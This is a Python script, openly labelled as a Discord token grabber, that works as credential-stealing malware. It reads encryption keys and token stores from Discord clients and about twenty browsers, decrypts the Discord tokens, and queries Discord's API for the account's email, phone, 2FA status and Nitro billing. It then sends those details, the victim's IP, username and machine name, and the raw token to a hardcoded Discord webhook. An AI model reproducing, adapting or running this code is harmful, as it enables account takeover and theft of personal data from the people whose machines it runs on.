from base64 import b64decode
from Crypto.Cipher import AES
from json import loads
from re import findall
from urllib.request import Request, urlopen
import requests
import json
import os
from datetime import datetime

tokens = []
cleaned = []
checker = []

def decrypt(buff, master_key):
    try:
        # Replace with PyCryptoDome AES decryption
        return AES.new(master_key, AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except Exception as e:
        print(f"Error decrypting: {e}")
        return "Error"

def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except Exception as e:
        print(f"Error fetching IP: {e}")
    return ip

def get_token():
    already_check = []
    checker = []
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    chrome = local + "/Google/Chrome/User Data/Default"
    paths = {
        'Discord': roaming + '/discord',
        'Discord Canary': roaming + '/discordcanary',
        'Lightcord': roaming + '/Lightcord',
        'Discord PTB': roaming + '/discordptb',
        'Opera': roaming + '/Opera Software/Opera Stable',
        'Opera GX': roaming + '/Opera Software/Opera GX Stable',
        'Amigo': local + '/Amigo/User Data',
        'Torch': local + '/Torch/User Data',
        'Kometa': local + '/Kometa/User Data',
        'Orbitum': local + '/Orbitum/User Data',
        'CentBrowser': local + '/CentBrowser/User Data',
        '7Star': local + '/7Star/7Star/User Data',
        'Sputnik': local + '/Sputnik/Sputnik/User Data',
        'Vivaldi': local + '/Vivaldi/User Data/Default',
        'Chrome SxS': local + '/Google/Chrome SxS/User Data',
        'Chrome': chrome,
        'Epic Privacy Browser': local + '/Epic Privacy Browser/User Data',
        'Microsoft Edge': local + '/Microsoft/Edge/User Data/Default',
        'Uran': local + '/uCozMedia/Uran/User Data/Default',
        'Yandex': local + '/Yandex/YandexBrowser/User Data/Default',
        'Brave': local + '/BraveSoftware/Brave-Browser/User Data/Default',
        'Iridium': local + '/Iridium/User Data/Default'
    }
    
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
        
        try:
            with open(os.path.join(path, "Local State"), "r", encoding="utf-8") as file:
                key = loads(file.read())['os_crypt']['encrypted_key']
        except Exception as e:
            print(f"Error reading {platform} Local State file: {e}")
            continue
        
        try:
            for file_name in os.listdir(os.path.join(path, "Local Storage", "leveldb")):
                if not file_name.endswith(".ldb") and not file_name.endswith(".log"):
                    continue
                
                file_path = os.path.join(path, "Local Storage", "leveldb", file_name)
                
                try:
                    with open(file_path, "r", encoding="utf-8", errors='ignore') as f:
                        content = f.read()
                        tokens.extend(findall(r"dQw4w9WgXcQ:([^.'\"]*)", content))
                except Exception as e:
                    print(f"Error reading file {file_path}: {e}")
        
        except Exception as e:
            print(f"Error accessing leveldb files in {platform}: {e}")

    for token in tokens:
        if token.endswith("\\"):
            token = token.replace("\\", "")
        elif token not in cleaned:
            cleaned.append(token)

    for token in cleaned:
        # Implement your token processing logic here
        try:
            # Replace with your decryption method
            tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
            checker.append(tok)
            
            for value in checker:
                if value not in already_check:
                    already_check.append(value)
                    headers = {'Authorization': tok, 'Content-Type': 'application/json'}
                    try:
                        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
                        if res.status_code == 200:
                            res_json = res.json()
                            ip = getip()
                            pc_username = os.getenv("USER")
                            pc_name = os.uname().nodename
                            user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
                            user_id = res_json['id']
                            email = res_json.get('email', 'Not Available')
                            phone = res_json.get('phone', 'Not Available')
                            mfa_enabled = res_json.get('mfa_enabled', False)
                            has_nitro = False
                            res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
                            nitro_data = res.json()
                            has_nitro = bool(len(nitro_data) > 0)
                            days_left = 0
                            if has_nitro:
                                d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                                d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                                days_left = abs((d2 - d1).days)
                            
                            embed = f"""**{user_name}** *({user_id})*\n
> :dividers: __Account Information__\n\tEmail: `{email}`\n\tPhone: `{phone}`\n\t2FA/MFA Enabled: `{mfa_enabled}`\n\tNitro: `{has_nitro}`\n\tExpires in: `{days_left if days_left else "None"} day(s)`\n
> :computer: __PC Information__\n\tIP: `{ip}`\n\tUsername: `{pc_username}`\n\tPC Name: `{pc_name}`\n\tPlatform: `{platform}`\n
> :piñata: __Token__\n\t`{tok}`\n
*Made by Astraa#6100* **|** ||https://github.com/astraadev||"""
                            
                            payload = json.dumps({'content': embed, 'username': 'Token Grabber - Made by Astraa', 'avatar_url': 'https://cdn.discordapp.com/attachments/826581697436581919/982374264604864572/atio.jpg'})
                            headers2 = {
                                'Content-Type': 'application/json',
                                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
                            }
                            req = Request('https://discord.com/api/webhooks/1247364290084606052/CnNsZ184abYfD1kj3yAtkOH873RS4c7HVpD5Ryps2wX5Sv4pG-zz9KCRZmPYHIff3llm', data=payload.encode(), headers=headers2)
                            urlopen(req)
                    
                    except Exception as e:
                        print(f"Error processing token: {e}")

if __name__ == '__main__':
    get_token()
